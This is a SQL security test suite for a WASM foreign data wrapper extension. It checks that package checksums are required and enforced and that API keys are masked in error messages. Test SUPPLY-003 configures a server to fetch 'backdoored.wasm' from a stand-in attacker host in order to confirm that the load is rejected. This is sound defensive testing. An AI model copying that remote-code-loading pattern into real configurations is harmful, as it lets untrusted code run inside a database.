-- WASM FDW Platform Security Tests
-- These tests verify security measures that apply to ALL WASM wrappers
-- See /SECURITY.md for documentation
--
-- Tests covered:
-- - Supply chain security (checksum requirement)
-- - Credential masking in error messages

-- ============================================================================
-- Setup
-- ============================================================================

CREATE EXTENSION IF NOT EXISTS wrappers;

-- ============================================================================
-- SECTION 1: Supply Chain Security Tests
-- These tests verify the WASM package checksum requirement
-- ============================================================================

SELECT '=== SECTION 1: Supply Chain Tests ===' AS section;

-- SUPPLY-001: Missing checksum should be rejected
-- This is the PRIMARY supply chain defense - checksum is REQUIRED
SELECT 'SUPPLY-001: Missing checksum must be rejected' AS test;
DO $$
BEGIN
  -- Attempt to create server WITHOUT checksum - this MUST fail
  CREATE SERVER no_checksum_server
    FOREIGN DATA WRAPPER wasm_wrapper
    OPTIONS (
      fdw_package_url 'file:///path/to/any_fdw.wasm',
      fdw_package_name 'test:fdw',
      fdw_package_version '1.0.0'
      -- Missing fdw_package_checksum!
    );

  -- If we get here, the security control FAILED
  RAISE EXCEPTION 'SUPPLY-001 FAILED: Server created without checksum - CRITICAL SECURITY VULNERABILITY';
EXCEPTION
  WHEN OTHERS THEN
    IF SQLERRM LIKE '%fdw_package_checksum%' THEN
      RAISE NOTICE 'SUPPLY-001 PASSED: Missing checksum correctly rejected - %', SQLERRM;
    ELSE
      -- Any other error means we should investigate
      RAISE NOTICE 'SUPPLY-001 INFO: Server creation failed (verify checksum enforcement) - %', SQLERRM;
    END IF;
END $$;

-- SUPPLY-002: Invalid checksum should be rejected at load time
SELECT 'SUPPLY-002: Invalid checksum verification' AS test;
DO $$
BEGIN
  -- Create server with WRONG checksum
  CREATE SERVER bad_checksum_server
    FOREIGN DATA WRAPPER wasm_wrapper
    OPTIONS (
      fdw_package_url 'file:///path/to/any_fdw.wasm',
      fdw_package_name 'test:fdw',
      fdw_package_version '1.0.0',
      fdw_package_checksum 'sha256:0000000000000000000000000000000000000000000000000000000000000000'
    );

  -- Server creation might succeed, but query should fail on checksum mismatch
  CREATE FOREIGN TABLE checksum_test (name text)
  SERVER bad_checksum_server
  OPTIONS (object 'test');

  PERFORM * FROM checksum_test;

  RAISE EXCEPTION 'SUPPLY-002 FAILED: Query succeeded with invalid checksum';
EXCEPTION
  WHEN OTHERS THEN
    IF SQLERRM LIKE '%checksum%' OR SQLERRM LIKE '%hash%' OR SQLERRM LIKE '%mismatch%' THEN
      RAISE NOTICE 'SUPPLY-002 PASSED: Invalid checksum rejected - %', SQLERRM;
    ELSE
      RAISE NOTICE 'SUPPLY-002 INFO: Request failed (verify checksum validation) - %', SQLERRM;
    END IF;
END $$;

-- SUPPLY-003: Malicious WASM URL with checksum still requires valid checksum
SELECT 'SUPPLY-003: Malicious URL with checksum requirement' AS test;
DO $$
BEGIN
  -- Even with a checksum, untrusted sources should be scrutinized
  CREATE SERVER malicious_wasm_server
    FOREIGN DATA WRAPPER wasm_wrapper
    OPTIONS (
      fdw_package_url 'https://evil-attacker.com/backdoored.wasm',
      fdw_package_name 'test:fdw',
      fdw_package_version '1.0.0',
      fdw_package_checksum 'sha256:abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234'
    );

  CREATE FOREIGN TABLE evil_test (name text)
  SERVER malicious_wasm_server
  OPTIONS (object 'test');

  PERFORM * FROM evil_test;

  -- If download succeeds but checksum doesn't match, it should fail
  RAISE NOTICE 'SUPPLY-003 WARNING: Malicious URL was accessed - verify network controls';
EXCEPTION
  WHEN OTHERS THEN
    -- Expected: either network error or checksum mismatch
    RAISE NOTICE 'SUPPLY-003 PASSED: Malicious WASM load failed - %', SQLERRM;
END $$;

-- ============================================================================
-- SECTION 2: Credential Masking Tests
-- These tests verify the sanitize_error_message() utility
-- ============================================================================

SELECT '=== SECTION 2: Credential Masking Tests ===' AS section;

-- CRED-001: Verify credentials not in error messages
-- The sanitize_error_message() utility masks sensitive values in error messages
SELECT 'CRED-001: Credentials should not appear in errors' AS test;
DO $$
DECLARE
  secret_value TEXT := 'SuperSecretKey12345DoNotLeak';
  error_msg TEXT;
BEGIN
  -- This test requires an FDW that uses sanitize_error_message()
  -- We use a generic WASM wrapper setup that will fail and check the error
  CREATE SERVER cred_test_server
    FOREIGN DATA WRAPPER wasm_wrapper
    OPTIONS (
      fdw_package_url 'file:///nonexistent/path.wasm',
      fdw_package_name 'test:fdw',
      fdw_package_version '1.0.0',
      fdw_package_checksum 'sha256:0000000000000000000000000000000000000000000000000000000000000000',
      api_key 'SuperSecretKey12345DoNotLeak'
    );

  CREATE FOREIGN TABLE cred_leak_test (name text)
  SERVER cred_test_server
  OPTIONS (object 'test');

  PERFORM * FROM cred_leak_test;
EXCEPTION
  WHEN OTHERS THEN
    error_msg := SQLERRM;

    -- Check for unmasked credentials (more than first 4 chars visible)
    -- This is the critical security check - any of these patterns indicate a leak
    IF error_msg LIKE '%SuperSecretKey12345%' THEN
      RAISE EXCEPTION 'CRED-001 FAILED: Full secret key leaked in error: %', error_msg;
    ELSIF error_msg LIKE '%SuperSecret%' THEN
      RAISE EXCEPTION 'CRED-001 FAILED: Partial secret key leaked (>4 chars): %', error_msg;
    ELSIF error_msg LIKE '%Super%' AND error_msg NOT LIKE '%Supe***%' THEN
      RAISE EXCEPTION 'CRED-001 FAILED: Secret key prefix leaked without masking: %', error_msg;
    END IF;

    -- If we reach here, no unmasked credential was found
    -- Now determine if masking was applied or credential wasn't in error path
    IF error_msg LIKE '%Supe***%' THEN
      RAISE NOTICE 'CRED-001 PASSED: Secret key properly masked in error message';
    ELSE
      -- Credential not in error message at all - this is acceptable but worth noting
      -- The error path may not have included the credential
      RAISE NOTICE 'CRED-001 PASSED: No credential leak detected (credential not in error path)';
      RAISE NOTICE 'CRED-001 INFO: Error was: %', error_msg;
    END IF;
END $$;

-- ============================================================================
-- SECTION 3: DoS Protection Tests (Documentation)
-- ============================================================================

SELECT '=== SECTION 3: DoS Protection Tests ===' AS section;

-- DOS-001: Test timeout handling
SELECT 'DOS-001: HTTP timeout handling' AS test;
-- Note: This test would require a slow endpoint to properly test
-- For now we just document that timeout protection should exist
SELECT 'DOS-001 INFO: Timeout protection should be implemented in HTTP client' AS info;

-- DOS-002: Large response handling
SELECT 'DOS-002: Large response protection' AS test;
SELECT 'DOS-002 INFO: Response size limits should be implemented' AS info;

-- ============================================================================
-- Cleanup
-- ============================================================================

DROP SERVER IF EXISTS no_checksum_server CASCADE;
DROP SERVER IF EXISTS bad_checksum_server CASCADE;
DROP SERVER IF EXISTS malicious_wasm_server CASCADE;
DROP SERVER IF EXISTS cred_test_server CASCADE;

SELECT '=== WASM Platform Security Tests Complete ===' AS status;
SELECT 'IMPORTANT: Review any FAILED or WARNING results above' AS note;
